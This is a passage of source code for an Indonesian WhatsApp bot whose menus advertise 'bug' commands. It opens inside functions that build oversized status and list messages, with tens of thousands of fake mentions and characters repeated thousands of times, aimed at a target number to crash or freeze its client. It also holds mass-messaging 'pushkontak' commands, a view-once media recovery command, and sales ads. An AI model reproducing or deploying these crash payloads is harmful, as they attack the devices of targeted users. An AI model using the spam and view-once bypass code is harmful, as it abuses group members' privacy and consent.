                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(isTarget, generateMessage, {});

    await dwiaff.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: isTarget },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await dwiaff.relayMessage(
            isTarget,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Nabzx V3",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "🔥 ᏃყɳҳᏃყ 🦠ɳσ Ꮳσυ⚡ɳƚҽɾ ⚡"
                        }
                    },
                    description: "🔥🦠 ᏃყɳҳᏃყ 🦠ɳσ ⚡Ꮳσυɳƚҽɾ ⚡"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await dwiaff.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
      
const reply = (teks) => { 
dwiaff.sendMessage(from, { text: teks, contextInfo: { 
externalAdReply : { 
showAdAttribution : true,  
title : "🔥 ᴅᴡɪᴀғғ", 
containsAutoReply : true, 
mediaType : 1, 
thumbnail : fs.readFileSync("./src/media/thumbnail.jpg"), 
mediaUrl : "https://img102.pixhost.to/images/24/555969613_skyzopedia.jpg", 
sourceUrl : "https://whatsapp.com/channel/0029Vag5c53KAwEk4hnzN220" }}}, { quoted: m }) }
      
const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/thumbnail.jpg") }, { upload: dwiaff.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*dwiaff* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*dwiaff Menyediakan 🌟*

* Panel Pterodactyl Server Private
* Panel Pterodactyl Server Public
* Script Bot WhatsApp
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Install Panel Pterodactyl
* Jasa Thema Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja

*Saluran Testimoni*
https://whatsapp.com/channel/0029Vaiz6CQ7oQha5Al83B3e`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat ᴅᴡɪᴀғғ\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp3.000

* Ram 2 GB : Rp4.000

* Ram 3 GB : Rp5.000

* Ram 4 GB : Rp6.000

* Ram 5 GB : Rp7.000

* Ram 6 GB : Rp8.000

* Ram 7 GB : Rp9.000

* Ram 8 GB : Rp10.000

* Ram 9 GB : Rp11.000

* Ram 10 GB : Rp12.000

* Ram Unlimited : Rp13.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat ᴅᴡɪᴀғғ\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `\`LIST VPS DIGITAL OCEAN BY dwiaff\`

* 🚀 RAM 1GB CORE 1 : => *25K* <=
* 🚀 RAM 2GB CORE 1 : => *35* <=
* 🚀 RAM 2GB CORE 2 : => *40K* <=
* 🚀 RAM 4GB CORE 2 : => *45K* <=
* 🚀 RAM 8GB CORE 4 : => *55K* <=
* 🚀 RAM 16GB CORE 4 : => *70k* <=

=> *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=> *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_* <=

\`Bonus Buy Vps\`
- Free Install Panel 1x
- Free Instal Wings/Node 1x
- Free Pasang Egg Bot/Mc
- Free Install Thema Buy Ram 8/16
- Garansi 15 Hari Nego? = Nogar
- Vps On 20 - 30 Hari 
- Garansi Hanya 1x Ambil

\`MINAT? CONTACT DI BAWAH\`
* NOMOR : wa.me//6285783089587
* TELE : t.me/nabzxstore

*JIKA DI SINI SLOWRES LANGSUNG BUH NO DI ATAS*

\`TESTI dwiaff\`
* https://whatsapp.com/channel/0029Vaiz6CQ7oQha5Al83B3e`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat ᴅᴡɪᴀғғl\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qloc})
await dwiaff.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

//============= [ COMMAND ] ===============
switch (command) {
case "dwiaff": {
let teksnya = `
╭━━━〔 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 𝘽𝙊𝙏〕━━━╮  
┃  ᴅᴇᴠᴇʟᴏᴘᴇʀ : ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ
┃  ᴠᴇʀsɪ sᴄʀɪᴘᴛ : ᴠ𝟹
┃  ɴᴀᴍᴇ ʙᴏᴛ : ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ
┃  ʙᴏᴛ ᴍᴏᴅᴇ : *${dwiaff.public ? "ᴘᴜʙʟɪᴄ": "sᴇʟғ"}*
┃  ʀᴜɴ ᴛɪᴍᴇ ʙᴏᴛ : ${runtime(process.uptime())}
╰━━━━━━━━━━━━━━━━━━━━━━━╯  

𝙎𝙞𝙡𝙖𝙝𝙠𝙖𝙣 𝙋𝙞𝙡𝙞𝙝 𝙈𝙚𝙣𝙪 𝘿𝙞 𝘽𝙖𝙬𝙖𝙝 𝙄𝙣𝙞
`
await dwiaff.sendMessage(m.chat, {
  footer: `ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ ᴠ𝟹`,
 buttons: [
    {
      buttonId: `.allmenu`,
      buttonText: { displayText: 'Aʟʟ Mᴇɴᴜ' }, 
      type: 1
    },
    {
      buttonId: `.bugmenu`,
      buttonText: { displayText: 'Bᴜɢ Mᴇɴᴜ' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ`,
  mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
  fileLength: 99999999,
  caption: teksnya,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.ownerUtama+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idsaluran,
   newsletterName: global.nameChannel
   }, 
    externalAdReply: {
      title: `ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛ ᴠ𝟹`,
      thumbnailUrl: randomImage,
      sourceUrl: linkOwner,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break

        case "produk": {            
await slideButton(m.chat)
}
break

case "allmenu": {  
await new Promise(resolve => setTimeout(resolve, 1));
  
const text12 = `
✨ *ʟɪsᴛ ᴘᴀɴᴇʟ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
> ➣ *.ᴀᴅᴅsᴇʟʟᴇʀ*  
> ➣ *.ᴅᴇʟsᴇʟʟᴇʀ*  
> ➣ *.ʟɪsᴛsᴇʟʟᴇʀ*  
> ➣ *.ᴀᴅᴅᴏᴡɴᴇʀ*  
> ➣ *.ᴅᴇʟᴏᴡɴᴇʀ*  
> ➣ *.ʟɪsᴛᴏᴡɴᴇʀ*  
> ➣ *.ʟɪsᴛᴘᴀɴᴇʟ*  
> ➣ *.ʟɪsᴛᴀᴅᴍɪɴ*  
> ➣ *.ᴅᴇʟᴘᴀɴᴇʟ*  
> ➣ *.ᴅᴇʟᴘᴀɴᴇʟᴀʟʟ*  
> ➣ *.ᴅᴇʟᴀᴅᴍɪɴ*  
> ➣ *.ᴄᴀᴅᴍɪɴ*  
> ➣ *.ᴄᴀᴅᴍɪɴ𝟷*  
> ➣ *.𝟷ɢʙ - ᴜɴʟɪ*  
> ➣ *.ᴄᴘᴀɴᴇʟ*  
> ➣ *.ᴄ𝟷ɢʙ - ᴄᴜɴʟɪ*  
> ➣ *.ʟɪɴᴋʟᴏɢ*  

🎮 *ɢᴀᴍᴇ ᴍᴇɴᴜ*

> ✗ *.ᴛᴇʙᴀᴋᴋᴀᴛᴀ*
> ✗ *.sᴜɪᴛ*
> ✗ *.ᴄᴇᴋᴋʜᴏᴅᴀᴍ*

🪬 *ʟɪsᴛ ᴘᴀɴᴇʟ ᴍᴇɴᴜ ᴠ𝟸 ʙᴏᴛᴢ*  
> ❥ *.ᴀᴅᴅᴘʀᴇᴍ*  
> ❥ *.ᴅᴇʟᴘʀᴇᴍ*  
> ❥ *.ʟɪsᴛᴘʀᴇᴍ*  
> ❥ *.ᴀᴅᴅᴏᴡɴᴇʀ*  
> ❥ *.ᴅᴇʟᴏᴡɴᴇʀ*  
> ❥ *.ʟɪsᴛᴏᴡɴᴇʀ*  
> ❥ *.ʟɪsᴛᴘᴀɴᴇʟ-ᴠ𝟸*  
> ❥ *.ʟɪsᴛᴀᴅᴍɪɴ-ᴠ𝟸*  
> ❥ *.ᴅᴇʟᴘᴀɴᴇʟ-ᴠ𝟸*  
> ❥ *.ᴅᴇʟᴘᴀɴᴇʟᴀʟʟ-ᴠ𝟸*  
> ❥ *.ᴅᴇʟᴀᴅᴍɪɴ-ᴠ𝟸*  
> ❥ *.ᴄᴀᴅᴍɪɴ-ᴠ𝟸*  
> ❥ *.ᴄᴀᴅᴍɪɴ𝟷-ᴠ𝟸*  
> ❥ *.𝟷ɢʙ - ᴜɴʟɪ-ᴠ𝟸*  
> ❥ *.ᴄᴘᴀɴᴇʟ-ᴠ𝟸*  
> ❥ *.ᴄ𝟷ɢʙ-ᴠ𝟸 - ᴄᴜɴʟɪ-ᴠ𝟸*  
> ❥ *.ʟɪɴᴋʟᴏɢ*

☯️ *ʟɪsᴛ ᴏʀᴋᴜᴛ ʜ𝟸ʜ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
> ›› *.ᴅᴀғᴛᴀʀʜᴀʀɢᴀ-ᴇᴡᴀʟʟᴇᴛ*  
> ›› *.ᴛᴏᴘᴜᴘsᴀʟᴅᴏ*  
> ›› *.ᴄᴇᴋsᴀʟᴅᴏ-ᴏʀᴋᴜᴛ*  
> ›› *.ᴄᴇᴋsᴛᴀᴛᴜs*  

🛒 *ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
> ›› *.ᴘᴀʏᴍᴇɴᴛ*  
> ›› *.ᴅᴀɴᴀ*  
> ›› *.ᴏᴠᴏ*  
> ›› *.ɢᴏᴘᴀʏ*  
> ›› *.ᴏ̨ʀɪs*  
> ›› *.ᴘʀᴏsᴇs*  
> ›› *.ᴅᴏɴᴇ*  

❤️‍🔥 *ʟɪsᴛ ɪɴsᴛᴀʟʟ ᴍᴇɴᴜ ʙᴏᴛᴢ*
> 徴 *.sᴛᴀʀᴛᴡɪɴɢs* 
> 徴 *.ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ* 
> 徴 *.ɪɴsᴛᴀʟʟᴛᴇᴍᴀ* 
> 徴 *.ᴜɴɪɴsᴛᴀʟʟᴛᴇᴍᴀ* 
> 徴 *.ʜʙᴘᴀɴᴇʟ*
> 徴 *.ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ*

🌟 *ʟɪsᴛ ᴏᴛᴏᴍᴀᴛɪs ᴍᴇɴᴜ ʙᴏᴛᴢ*  
> 🎶 *.ʙᴜʏᴘᴀɴᴇʟ*  
> 🎶 *.ʙᴜʏʀᴇsᴇʟʟᴇʀᴘᴀɴᴇʟ*  
> 🎶 *.ʙᴜʏsᴄ*  
> 🎶 *.ᴀᴅᴅsᴄʀɪᴘᴛ*  
> 🎶 *.ᴅᴇʟsᴄʀɪᴘᴛ*  
> 🎶 *.ʟɪsᴛsᴄ*  
> 🎶 *.ᴇᴅɪᴛsᴄ*  
> 🎶 *.ʙᴜʏᴄᴀsᴇ* 
> 🎶 *.ʙᴜʏᴀᴋᴜɴ*
> 🎶 *.ᴀᴅᴅᴀᴋᴜɴ*
> 🎶 *.ᴅᴇʟᴀᴋᴜɴ*
> 🎶 *.ʟɪsᴛᴀᴋᴜɴ*
> 🎶 *.ʙᴜʏᴀᴋᴜɴᴅᴏ*
> 🎶 *.ᴀᴅᴅᴀᴋᴜɴᴅᴏ*
> 🎶 *.ᴅᴇʟᴀᴋᴜɴᴅᴏ*
> 🎶 *.ʟɪsᴛᴀᴋᴜɴᴅᴏ*
> 🎶 *.ᴊᴀsᴀᴇɴᴄ*
> 🎶 *.ʙᴜʏsᴜʙᴅᴏ*
> 🎶 *.ᴊᴀsᴀɪɴsᴛᴀʟʟᴛᴇᴍᴀ* 
> 🎶 *.ᴊᴀsᴀɪɴsᴛᴀʟʟᴘᴀɴᴇʟ*
> 🎶 *.ᴊᴀsᴀʜʙᴘᴀɴᴇʟ*  
> 🎶 *.ᴅᴇᴘᴏsɪᴛ*  
> 🎶 *.ʙᴜʏᴠᴘs*  
> 🎶 *.ʙᴜʏᴏᴡɴᴘᴀɴᴇʟ*
> 🎶 *.ʙᴜʏᴀᴅᴘ*  

🛒 *ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
> ›› *.ᴘᴀʏᴍᴇɴᴛ*  
> ›› *.ᴅᴀɴᴀ*  
> ›› *.ᴏᴠᴏ*  
> ›› *.ɢᴏᴘᴀʏ*  
> ›› *.ᴏ̨ʀɪs*  
> ›› *.ᴘʀᴏsᴇs*  
> ›› *.ᴅᴏɴᴇ*  

📤 *ʟɪsᴛ ᴘᴜsʜ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
> ❀ *.ᴘᴜsʜᴋᴏɴᴛᴀᴋ*  
> ❀ *.ᴘᴜsʜᴋᴏɴᴛᴀᴋ𝟷*  
> ❀ *.ᴘᴜsʜᴋᴏɴᴛᴀᴋ𝟸*  
> ❀ *.sᴀᴠᴇᴋᴏɴᴛᴀᴋ*  
> ❀ *.sᴀᴠᴇᴋᴏɴᴛᴀᴋ𝟷*  
> ❀ *.ᴊᴘᴍ*  
> ❀ *.ᴊᴘᴍ𝟷*  
> ❀ *.ᴊᴘᴍ𝟸*  
> ❀ *.ᴊᴘᴍᴛᴇsᴛɪ*  
> ❀ *.ᴊᴘᴍsʟɪᴅᴇ*  
> ❀ *.ᴊᴘᴍᴄʜғᴏᴛᴏ*  
> ❀ *.ᴀᴅᴅɪᴅᴄʜ*  
> ❀ *.ᴀᴅᴅɪᴅᴄʜᴠ𝟸*
> ❀ *.ʟɪsᴛɪᴅᴄʜ*  
> ❀ *.ᴅᴇʟɪᴅᴄʜ*  
> ❀ *.ᴊᴘᴍᴀʟʟᴄʜ*  
> ❀ *.ᴊᴘᴍᴄʜ*  
> ❀ *.ᴊᴘᴍᴄʜᴠɪᴅᴇᴏ*  
> ❀ *.ᴊᴘᴍsʟɪᴅᴇʜᴛ*  
> ❀ *.ʟɪsᴛɢᴄ*  
> ❀ *.ᴄᴇᴋɪᴅᴄʜ*  

🖥️ *ʟɪsᴛ ᴄᴠᴘs ᴍᴇɴᴜ ʙᴏᴛᴢ*  
💻 *.ᴅᴇʟᴅʀᴏᴘʟᴇᴛ*  
💻 *.sɪsᴀᴅʀᴏᴘʟᴇᴛ*  
💻 *.ʀᴇʙᴜɪʟᴅ*  
💻 *.ʀᴇsᴛᴀʀᴛᴠᴘs*  
💻 *.ʟɪsᴛᴅʀᴏᴘʟᴇᴛ*  
💻 *.ᴠᴘs𝟷ɢᴄ𝟷*  
💻 *.ᴠᴘs𝟸ɢ𝟷ᴄ*  
💻 *.ᴠᴘs𝟸ɢ𝟸ᴄ*  
💻 *.ᴠᴘs𝟺ɢ𝟸ᴄ*  
💻 *.ᴠᴘs𝟾ɢ𝟺ᴄ*  
💻 *.ᴠᴘs𝟷𝟼ɢ𝟺ᴄ*  
💻 *.ᴄᴠᴘs*  
💻 *.ᴄʀᴇᴀᴛᴇᴠᴘs*  

📜 *ʟɪsᴛ ᴛᴏᴏʟs ᴍᴇɴᴜ ʙᴏᴛᴢ*  
💬 *.sᴛɪᴄᴋᴇʀ*  
💬 *.ǫᴄ*  
💬 *.ʙʀᴀᴛ*  
💬 *.ʙʀᴀᴛvɪᴅ*  
💬 *.ᴇᴍᴏᴊɪᴍɪx*
💬 *.ᴅᴇᴘsᴇᴋ*
💬 *.ᴀɪ*  
💬 *.ᴛᴏᴜʀʟ*  
💬 *.ᴄᴋᴀʟᴇɴᴅᴇʀ*
💬 *.ᴀᴠᴏs*
💬 *.ʀᴀɴᴅᴏᴍʜᴀᴅɪsᴛ*
💬 *.ᴛᴀʜᴜᴋᴀʜᴋᴀᴍᴜ*
💬 *.ᴄᴇᴋɢᴇᴍᴘᴀ*
💬 *.ʀᴜᴛᴇ*
💬 *.ᴛᴏʜᴅ*  
💬 *.ʀᴠᴏ*  
💬 *.ʀᴇᴀᴅǫʀ*
💬 *.sᴛʀ*
💬 *.ɪɢsᴛᴀʟᴋ*
💬 *.ᴛɪᴋᴛᴏᴋsᴛᴀʟᴋ*
💬 *.ᴛʀᴀɴsʟᴀᴛᴇ*  
💬 *.ɢᴇᴛsᴛɪᴄᴋᴇʀ*  
💬 *.sᴛɪᴄᴋᴇʀᴡᴍ*  

📥 *ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
📹 *.ᴛɪᴋᴛᴏᴋ*
📹 *.ᴛɪᴋᴛᴏᴋᴍᴘ𝟹*
📹 *.ɪɴsᴛᴀɢʀᴀᴍ*
📹 *.ʏᴛᴍᴘ𝟺*
📹 *.ʏᴛᴍᴘ𝟹*
📹 *.ᴘʟᴀʏ*
📹 *.xɴxxs*
📹 *.xɴxxᴅʟ*
📹 *.ᴍᴇᴅɪᴀғɪʀᴇ*  
📹 *.ᴠɪᴅᴇʏ*

👥 *ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
👤 *.ᴏɴ*  
👤 *.oғғ*  
👤 *.ʜɪᴅᴇᴛᴀɢ*  
👤 *.ᴀᴅᴅᴍᴇᴍʙᴇʀ*
👤 *.ᴄʟᴏsᴇɢᴄ* 
👤 *.ᴏᴘᴇɴɢᴄ*  
👤 *.ᴋɪᴄᴋ*  
👤 *.ᴋɪᴄᴋᴛɪᴍᴇ*
👤 *.sᴘᴀᴍᴛᴀɢ* 
👤 *.ᴘʀᴏᴍᴏᴛᴇ* 
👤 *.ᴅᴇᴍᴏᴛᴇ*

🛡️ *ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ ʙᴏᴛᴢ*  
🔑 *.ᴏᴡɴᴇʀ*
🔑 *.sᴇʟғ/ᴘᴜʙʟɪᴄ*
🔑 *.ᴀᴅᴅᴅʙ*
🔑 *.sᴜʙᴅᴏ*
🔑 *.ᴀᴅᴅᴄᴀsᴇ*
🔑 *.ᴅᴇʟᴄᴀsᴇ*
🔑 *.ɢᴇᴛᴄᴀsᴇ*
🔑 *.ɢᴇᴛғɪʟᴇ*
🔑 *.ɢᴇᴛᴀᴋᴜɴ*
🔑 *.ɢᴇᴛᴀᴋᴜɴᴅᴏ*
🔑 *.sᴀᴠᴇsᴛɪᴄᴋᴇʀ*
🔑 *.ʀᴇᴀᴄᴛᴄʜ*
🔑 *.ʙᴜᴀᴛɢᴄ*
🔑 *.ᴀᴜᴛᴏᴘʀᴏᴍᴏsɪ*
🔑 *.ᴀᴜᴛᴏᴛʏᴘɪɴɢ*
🔑 *.ᴀᴜᴛᴏʀᴇᴀᴅ*
🔑 *.ᴀᴜᴛᴏʀᴇᴀᴅsᴡ*
🔑 *.ᴊᴏɪɴɢᴄ*
🔑 *.ᴊᴏɪɴᴄʜ*`

dwiaff.sendMessage(m.chat, {       
video: { url: randomUrl },   
mimetype: 'video/mp4',
fileLength: 1000000,
caption: text12,
gifPlayback: true,
gifAttribution: 5,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
forwardingScore: 2023,
title: 'dwiaff',
thumbnailUrl: randomImage,
sourceUrl: 'https://whatsapp.com/channel/0029Vaiz6CQ7oQha5Al83B3e', 
mediaType: 1,
renderLargerThumbnail: true,
}}}, { quoted: qtext
 })
      await dwiaff.sendMessage(m.chat, {
                        audio: fs.readFileSync('./menu.mp3'),
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break               
             
case "bugmenu": {  
await new Promise(resolve => setTimeout(resolve, 1));
  
const text12 = `
🛡️ *ʟɪsᴛ ʙᴜɢ ᴍᴇɴᴜ ғᴄ*  
> ✗ *.ғᴄʜᴀʀᴅ*
> ✗ *.xᴛʀᴀsʜ*
> ✗ *.ғʟᴏᴡғᴄ*
     
🛡️ *ʟɪsᴛ ʙᴜɢ ᴅᴇʟᴀʏ ʙᴏᴛᴢ*  
> ✗ *.ᴅᴡɪ*  
> ✗ *.ᴀғғɪғᴀ*  
> ✗ *.ᴅᴡɪᴀғғ*  
> ✗ *.ᴀsɪsᴛ*  `

dwiaff.sendMessage(m.chat, {       
video: { url: randomUrl },   
mimetype: 'video/mp4',
fileLength: 1000000,
caption: text12,
gifPlayback: true,
gifAttribution: 5,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
forwardingScore: 2023,
title: 'dwiaff',
thumbnailUrl: randomImage,
sourceUrl: 'https://whatsapp.com/channel/0029Vaiz6CQ7oQha5Al83B3e', 
mediaType: 1,
renderLargerThumbnail: true,
}}}, { quoted: qtext
 })
      await dwiaff.sendMessage(m.chat, {
                        audio: fs.readFileSync('./menu.mp3'),
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break                            

case "proses": { 
    if (!isCreator) return reply(mess.owner)
    if (!q) return m.reply(example("panel"));

    const msg = {
        text: `
╭──────────❲ *PROSES*❳─────────╮
  📦 *Detail Transaksi:*
  ${text}

  🕐 *Status*: Proses ✅
      *Catatan*: Terima kasih atas kepercayaannya.

        ━━━━━━━━━━━━━━━━━━━━
  ✨ *_Selamat menggunakan layanan kami!_*
╰───────────────────────────╯

_*© 2025 - ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛV3*_
        `
    };
    await dwiaff.sendMessage(m.chat, msg, { quoted: qtoko });
}
break;

case "done": {
    if (!isCreator) return reply(mess.owner)
    if (!q) return m.reply(example("panel"));

    const msg = {
        text: `
╭──────────❲ *DONE*❳─────────╮
  📦 *Detail Transaksi:*
  ${text}

  🕐 *Status*: Sukses ✅
  🎯 *Catatan*: Terima kasih atas kepercayaannya.

        ━━━━━━━━━━━━━━━━━━━━
  ✨ *_Selamat menggunakan layanan kami!_*
╰─────────────────────────╯

_*© 2025 - ᴅᴡɪᴀғғ ᴀsɪsᴛᴀɴᴛV3*_`
    };
    await dwiaff.sendMessage(m.chat, msg, { quoted: qtoko });
}
break;

case "pushkontak": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await dwiaff.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak*`)
for (let mem of halls) {
if (mem !== botNumber) {
const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + `FN:${namaOwner}\n`
            + 'ORG:Developer;\n'
            + `TEL;type=CELL;type=VOICE;waid=${global.owner}:${global.owner}\n`
            + 'END:VCARD'
const sentMsg  = await dwiaff.sendMessage(mem, { contacts: { displayName: namaOwner, contacts: [{ vcard }] }})
await dwiaff.sendMessage(mem, {text: teks}, {quoted: sentMsg })
await sleep(global.delayPushkontak)
}}

await dwiaff.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return dwiaff.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return dwiaff.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return dwiaff.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "pushkontak1":
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return m.reply(`dalam grup`)
if (!text) return m.reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await m.reply(`Memproses *pushkontak*`)
const data = await dwiaff.groupMetadata(m.chat)
const halsss = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await dwiaff.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await dwiaff.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await dwiaff.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
                    quoted: qloc
                    }
}
m.reply(`*Berhasil Pushkontak ✅*\n*Total member ${halsss.length} berhasil dikirim pesan*`)
break

case "pushkontak2": {

if (!isCreator) return reply(mess.owner)
if (!text) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply("*Contoh Command :*\n.pushgt idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
